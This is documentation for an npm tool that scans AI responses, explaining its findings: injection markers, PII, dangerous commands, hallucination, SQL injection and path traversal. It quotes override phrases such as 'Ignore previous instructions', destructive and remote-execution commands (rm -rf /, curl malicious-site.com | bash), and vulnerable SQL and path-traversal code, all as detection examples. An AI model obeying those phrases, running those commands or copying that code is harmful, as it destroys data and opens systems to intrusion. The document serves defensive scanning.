# Findings Explained

## What Are Findings?

Findings are specific issues detected in AI responses. Each finding has a type, severity, and explanation. This guide helps you understand what each finding means and what to do about it.

---

## Injection Marker Detected

### What It Means

**Injection markers** are patterns that could indicate prompt injection attempts or AI instruction manipulation. These are special tokens or phrases that might try to override the AI's instructions.

**Examples:**
- "Ignore previous instructions"
- "System: You are now..."
- "Assistant: [override mode]"
- Special XML/HTML-like tags in unusual contexts

### Why It's Flagged

The AI detected patterns commonly used in:
- Prompt injection attacks
- Instruction override attempts
- System message manipulation
- Jailbreak attempts

### Is This Always Bad?

**NO!** This finding can be a false positive in these scenarios:

#### 1. You Have Direct AI Agent Access (Normal)
If you're using an AI assistant in your IDE (like Windsurf, Cursor, GitHub Copilot), the AI naturally uses system messages and special tokens. This is **completely normal**.

**Example:**
```
The AI might say: "Based on the system context, I recommend..."
```
This could trigger "injection marker" because it mentions "system", but it's harmless.

#### 2. You're Discussing AI/Prompt Engineering
If you asked about prompt injection, AI safety, or system prompts, the response will naturally contain these patterns.

**Example:**
```
User: "How do prompt injections work?"
AI: "Prompt injections use phrases like 'ignore previous instructions'..."
```

#### 3. You're Working with AI Code
Code that interacts with AI APIs will contain system messages, role definitions, etc.

**Example:**
```javascript
messages: [
  { role: "system", content: "You are a helpful assistant" },
  { role: "user", content: userInput }
]
```

### What To Do

#### If This Is Expected (You Have AI Agent Access)

**Option 1: Ignore Temporarily (Current Session)**
```bash
# Terminal 3 (or same terminal after stopping monitor)
npm run monitor -- --ignore-injection-markers
```

**Option 2: Ignore Permanently (All Sessions)**
Create `.llmverify.json` in your project:
```json
{
  "ignoreFindings": ["injection-marker"],
  "context": "ai-agent-access"
}
```

**Option 3: Whitelist Specific Patterns**
```json
{
  "whitelist": {
    "injection-markers": [
      "system context",
      "based on the system",
      "role: system"
    ]
  }
}
```

#### If This Is Unexpected (Potential Attack)

1. **Review the content** - Is someone trying to manipulate the AI?
2. **Check the source** - Where did this response come from?
3. **Verify intent** - Was this a legitimate query about AI?
4. **Report if malicious** - Document the attempt

---

## PII Detected

### What It Means

**PII (Personally Identifiable Information)** includes data that can identify a specific person.

**Examples:**
- Email addresses: john.doe@company.com
- Phone numbers: (555) 123-4567
- Social Security Numbers: 123-45-6789
- Credit card numbers: 4532-1234-5678-9010
- Physical addresses: 123 Main St, City, State

### Why It's Flagged

Exposing PII can lead to:
- Privacy violations
- GDPR/CCPA compliance issues
- Identity theft
- Data breaches

### Is This Always Bad?

**NO!** False positives occur when:

#### 1. Using Example Data
```javascript
// This is fine - obviously fake
const email = "user@example.com";
const phone = "(555) 555-5555";
```

#### 2. Public Information
- Company contact information
- Published author emails
- Public support numbers

#### 3. You Explicitly Requested It
If you asked "show me an email format example", the AI will include one.

### What To Do

#### If This Is Example/Fake Data

**Option 1: Ignore This Instance**
Just note it's example data and proceed.

**Option 2: Configure Whitelist**
```json
{
  "whitelist": {
    "pii": [
      "example.com",
      "test.com",
      "555-555-5555"
    ]
  }
}
```

#### If This Is Real PII

1. **Redact immediately** - Remove or replace with fake data
2. **Don't share** - Don't paste into public channels
3. **Review prompt** - Why did AI include real PII?
4. **Report if needed** - If AI leaked real user data, report to AI provider

---

## Dangerous Command Detected

### What It Means

Commands that could harm your system, delete data, or compromise security.

**Examples:**
- `rm -rf /` - Delete everything
- `dd if=/dev/zero of=/dev/sda` - Wipe disk
- `chmod 777 -R /` - Remove all security
- `curl malicious-site.com | bash` - Execute remote code

### Why It's Flagged

These commands can:
- Delete important files
- Compromise system security
- Install malware
- Expose sensitive data

### Is This Always Bad?

**NO!** False positives occur when:

#### 1. You Asked for Dangerous Commands
If you're learning about system administration or security, you might ask "what's a dangerous command?"

#### 2. You're Writing Security Documentation
Creating guides about what NOT to do will include dangerous examples.

#### 3. You're Building Security Tools
Developing security scanners requires knowing attack patterns.

### What To Do

#### If You Requested This Information

**Option 1: Acknowledge and Proceed Carefully**
You know what you're doing, just be careful not to actually run it.

**Option 2: Add Context to Config**
```json
{
  "context": "security-research",
  "allowDangerousCommands": true,
  "requireConfirmation": true
}
```

#### If This Was Unexpected

1. **DO NOT RUN THE COMMAND** - Ever
2. **Review the query** - Why did AI suggest this?
3. **Rephrase question** - Ask for safer alternatives
4. **Report if malicious** - If AI is suggesting harmful actions unprompted

---

## Hallucination Detected

### What It Means

The AI made claims that appear to be fabricated or unverifiable.

**Examples:**
- Citing non-existent research papers
- Providing specific statistics without sources
- Making definitive claims about uncertain topics
- Fabricating historical events or dates

### Why It's Flagged

Hallucinations can lead to:
- Spreading misinformation
- Making wrong decisions
- Building on false assumptions
- Damaging credibility

### Is This Always Bad?

**Depends on context:**

#### When It's Acceptable
- Creative writing or brainstorming
- Hypothetical scenarios
- Learning exercises (with verification)
- Generating ideas (not facts)

#### When It's Problematic
- Research or academic work
- Business decisions
- Medical/legal advice
- Technical documentation

### What To Do

#### If You're Brainstorming (OK)
```json
{
  "context": "creative-writing",
  "allowHallucinations": true
}
```

#### If You Need Facts (Not OK)

1. **Verify every claim** - Use authoritative sources
2. **Ask for sources** - "Please cite sources for these statistics"
3. **Cross-reference** - Check multiple sources
4. **Use fact-checking tools** - Verify independently

---

## Consistency Issues

### What It Means

The AI contradicted itself within the same response.

**Examples:**
- "Python is faster than JavaScript... JavaScript is faster than Python"
- "First, do X... Later, never do X"
- "This happened in 1990... This happened in 1995" (about same event)

### Why It's Flagged

Contradictions indicate:
- Confused reasoning
- Merged conflicting information
- Lack of coherent understanding
- Potential errors

### Is This Always Bad?

**Usually yes**, but context matters:

#### Acceptable Cases
- Presenting multiple viewpoints
- Discussing pros and cons
- Showing evolution over time
- Comparing different scenarios

#### Problematic Cases
- Factual statements
- Instructions or procedures
- Technical specifications
- Critical decisions

### What To Do

1. **Identify the contradiction** - What exactly conflicts?
2. **Ask for clarification** - "You said X and Y, which is correct?"
3. **Request revision** - "Please review for consistency"
4. **Verify externally** - Check authoritative sources

---

## SQL Injection Pattern

### What It Means

Code patterns that could allow SQL injection attacks.

**Examples:**
```javascript
// DANGEROUS
const query = `SELECT * FROM users WHERE id = ${userId}`;

// DANGEROUS
db.query("SELECT * FROM users WHERE name = '" + userName + "'");
```

### Why It's Flagged

SQL injection can:
- Expose entire database
- Delete all data
- Modify records
- Bypass authentication

### Is This Always Bad?

**Context matters:**

#### When It's a Problem (Production Code)
If this is code you'll actually use, it's a critical security vulnerability.

#### When It's OK (Learning/Examples)
- Educational examples showing what NOT to do
- Security training materials
- Code review examples

### What To Do

#### If This Is Production Code

**FIX IMMEDIATELY:**
```javascript
// SAFE - Use parameterized queries
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [userId]);

// SAFE - Use ORM
const user = await User.findById(userId);
```

#### If This Is Educational

Add comments:
```javascript
// EXAMPLE OF VULNERABLE CODE - DO NOT USE
const badQuery = `SELECT * FROM users WHERE id = ${userId}`;

// CORRECT APPROACH
const safeQuery = 'SELECT * FROM users WHERE id = ?';
```

---

## Path Traversal Detected

### What It Means

Code that could allow accessing files outside intended directories.

**Examples:**
```javascript
// DANGEROUS
const filePath = '/uploads/' + userFileName;
fs.readFile(filePath);

// User could provide: ../../etc/passwd
```

### Why It's Flagged

Path traversal can:
- Read sensitive files
- Access system files
- Bypass security controls
- Expose credentials

### Is This Always Bad?

**Context dependent:**

#### When It's a Problem
- Production file handling code
- User upload systems
- API file access

#### When It's OK
- Security examples
- Educational content
- Penetration testing tools

### What To Do

#### If This Is Production Code

**FIX IMMEDIATELY:**
```javascript
const path = require('path');

// Sanitize input
const safeFileName = path.basename(userFileName);
const filePath = path.join('/uploads', safeFileName);

// Verify it's still in allowed directory
if (!filePath.startsWith('/uploads/')) {
  throw new Error('Invalid file path');
}
```

#### If This Is Educational

Clearly mark it:
```javascript
// VULNERABLE EXAMPLE - Shows path traversal risk
// DO NOT USE IN PRODUCTION
```

---

## Configuration Guide

### Ignore Findings Temporarily

```bash
# Ignore specific finding types for current session
npm run monitor -- --ignore injection-marker,pii

# Ignore all findings (not recommended)
npm run monitor -- --ignore-all
```

### Ignore Findings Permanently

Create `.llmverify.json`:

```json
{
  "ignoreFindings": [
    "injection-marker",
    "pii"
  ],
  "context": "ai-agent-development",
  "whitelist": {
    "injection-markers": [
      "system:",
      "role:",
      "assistant:"
    ],
    "pii": [
      "example.com",
      "test.com",
      "555-555-5555"
    ]
  },
  "allowDangerousCommands": false,
  "requireConfirmation": true
}
```

### Context-Aware Configuration

```json
{
  "contexts": {
    "production": {
      "ignoreFindings": [],
      "strictMode": true
    },
    "development": {
      "ignoreFindings": ["injection-marker"],
      "strictMode": false
    },
    "learning": {
      "ignoreFindings": ["injection-marker", "dangerous-command"],
      "allowHallucinations": true
    }
  },
  "activeContext": "development"
}
```

### Per-Project Configuration

Different projects can have different rules:

**AI Development Project:**
```json
{
  "context": "ai-development",
  "ignoreFindings": ["injection-marker"],
  "reason": "Working with AI APIs requires system messages"
}
```

**Production API:**
```json
{
  "context": "production",
  "ignoreFindings": [],
  "strictMode": true,
  "blockOnCritical": true
}
```

---

## Quick Reference

| Finding | Common False Positive | Safe to Ignore? | How to Ignore |
|---------|----------------------|-----------------|---------------|
| Injection Marker | AI agent responses | Yes, if you have AI access | `--ignore injection-marker` |
| PII | Example data | Yes, if fake/example | Whitelist example.com |
| Dangerous Command | Security learning | Yes, if educational | Add context |
| Hallucination | Creative writing | Depends on use case | Set context |
| SQL Injection | Educational code | No, fix the code | N/A |
| Path Traversal | Security examples | No, fix the code | N/A |

---

## Best Practices

1. **Understand before ignoring** - Know why it was flagged
2. **Use context** - Set appropriate context for your work
3. **Whitelist carefully** - Only whitelist known-safe patterns
4. **Review regularly** - Audit your ignore rules
5. **Document decisions** - Note why you ignored something
6. **Never ignore in production** - Always fix real security issues

---

## When to Contact Support

- Persistent false positives
- Findings you don't understand
- Configuration issues
- Feature requests for better detection

GitHub Issues: https://github.com/subodhkc/llmverify-npm/issues
